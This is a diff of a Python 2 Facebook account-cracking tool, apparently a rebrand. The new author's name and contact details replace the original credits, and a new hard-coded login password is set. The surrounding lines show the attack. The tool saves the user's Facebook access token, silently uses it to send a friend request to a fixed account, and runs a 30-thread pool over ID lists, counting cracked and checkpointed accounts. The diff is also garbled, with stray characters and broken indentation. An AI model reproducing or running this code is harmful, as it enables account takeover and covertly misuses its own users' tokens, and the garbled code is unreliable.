@@ -1,22 +1,15 @@
-#!/usr/bin/python2
-#coding=utf-8
-#The Credit For This Code Goes To Mansoor Khan,Muhammad Usman
-#If You Wanna Take Credits For This Code, Please Look Yourself Again...
-#Reserved2020
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize	fdd
+from multiprocessing.pool import ThreadPool	
+from requests.exceptions import ConnectionError	
+from mechanize import Browser	
 
 
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-
-
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+ reload(sys)	
+sys.setdefaultencoding('utf8')	
+br = mechanize.Browser()	
+br.set_handle_robots(False)	
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)	
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]	
 
 
  def keluar():	
@@ -51,18 +44,18 @@ br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U
 
  ##### LOGO #####	
 logo = """	
-\033[1;97m#        #  ~~~~~~~~~~~      ##    #       #
-\033[1;97m#        #       #        #     ## #       #
-\033[1;92m#        #       #        #        #       #
-\033[1;92m##########       #          ###    #       #
-\033[1;92m#        #       #              #  #       #
-\033[1;92m#        #       #        ##    #  #       #
-\033[1;92m#        #       #           ##     #######	
+           \033[1;97m::::::::    :::   :::   ::::::::::: 	
+         \033[1;97m:+:    :+:  :+:+: :+:+:      :+:      	
+        \033[1;92m+:+    +:+ +:+ +:+:+ +:+     +:+       	
+       \033[1;92m+#+    +:+ +#+  +:+  +#+     +#+        	
+      \033[1;92m+#+    +#+ +#+       +#+     +#+         	
+     \033[1;92m#+#    #+# #+#       #+#     #+#          	
+     \033[1;92m########  ###       ### ###########	
 \033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●	
-\033[1;91mAuthor©\033[1;91m: \033[1;93mMuhammad Usman
-\033[1;91mGitHub\033[1;91m: \033[1;93mhttps://Github.com/HTSUPK
-\033[1;91mFacebook\033[1;91m: \033[1;93mhttps://www.facebook.com/HTSUsmanOfficial
-\033[1;91mWhatsapp\033[1;91m: \033[1;93m+1 (437) 371-0506
+\033[1;97mAuthor©\033[1;97m: \033[1;92mOmi Chaudhary	
+\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Omi6t	
+\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Omi6t	
+\033[1;97mWhatsapp\033[1;97m: \033[1;92m+923117675174	
 \033[1;97m«-----------------------\033[1;92m✧✧\033[1;97m-----------------------»"""	
 
  def tik():	
@@ -88,10 +81,10 @@ print  """
 \033[1;97m | |/ |/ / /___/ /___/ /___/ /_/ / /  / / /___   \033[0m	
 \033[1;97m |__/|__/_____/_____/\____/\____/_/  /_/_____/\033[3;97mv1.1\033[0m	
 \033[1;94m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m๑۩۩۩๑\033[1;94m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●	
-\033[1;91mAuthor©\033[1;91m: \033[1;93mMuhammad Usman
-\033[1;91mGitHub\033[1;91m: \033[1;93mhttps://Github.com/HTSUPK
-\033[1;91mFacebook\033[1;91m: \033[1;93mhttps://www.facebook.com/HTSUsmanOfficial
-\033[1;91mWhatsapp\033[1;91m: \033[1;93m+1 (437) 371-0506
+\033[1;94mAuthor©: \033[1;97mOmi Chaudhary	
+\033[1;94mInstagram: \033[1;97mhttps://www.Instagram.com/Omi6t	
+\033[1;94mFacebook: \033[1;97mhttps://www.facebook.com/Omi6t	
+\033[1;94mWhatsapp: \033[1;97m+923117675174	
 \033[1;94m«-----------------------\033[1;97m✧✧\033[1;94m-----------------------»\033[1;97m"""	
 jalan("\033[1;41mDisclaimer:\033[0m \033[1;97mDeveloper Assume No Liability and Not")	
 jalan("\033[1;97m	    Responsible for any Misuse or Damage.")	
@@ -103,8 +96,8 @@ print "\033[1;97mAccount that goes to Checkpoint is due to Facebook"
 print "\033[1;97mSecurity,Tool is not Responsible for this Thing..."	
 print "\033[1;94m«-----------------\033[1;95mLogin With Tool\033[1;94m----------------»"	
 
-CorrectUsername = "Admin"
-CorrectPassword = "anonHTSU"
+ CorrectUsername = "Omi6t"	
+CorrectPassword = "Omi"	
 
  loop = 'true'	
 while (loop == 'true'):	
@@ -117,10 +110,10 @@ while (loop == 'true'):
             loop = 'false'	
         else:	
             print "\033[1;91mWrong Password"	
-            os.system('xdg-open https://www.Facebook.com/HTSUsmanOfficial')	
+            os.system('xdg-open https://www.Facebook.com/Omi6t')	
     else:	
         print "\033[1;91mWrong Username"	
-        os.system('xdg-open https://www.Facebook.com/HTSUsmanOfficial')	
+        os.system('xdg-open https://www.Facebook.com/Omi6t')	
 
  def login():	
 	os.system('clear')	
@@ -163,7 +156,7 @@ while (loop == 'true'):
 				unikers.write(z['access_token'])	
 				unikers.close()	
 				print '\n\x1b[1;92mLogin Successful...'	
-				os.system('xdg-open https://www.Facebook.com/HTSUsmanOfficial')	
+				os.system('xdg-open https://www.Facebook.com/Omi6t')	
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])	
 				menu()	
 			except requests.exceptions.ConnectionError:	
@@ -415,7 +408,7 @@ while (loop == 'true'):
  	p = ThreadPool(30)	
 	p.map(main, id)	
 	print "\033[1;97m«-----------------------\033[1;92m✧✧\033[1;97m-----------------------»"	
-	print "\033[1;91m«-----------Developed By Muhammad Usman (HTSUsmanOfficial)-----------»"	
+	print "\033[1;91m«-----------Developed By Omi Chaudhary-----------»"	
 	print '\033[1;92mProcess Has Been Completed\033[1;92m....'	
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))	
 	print """	
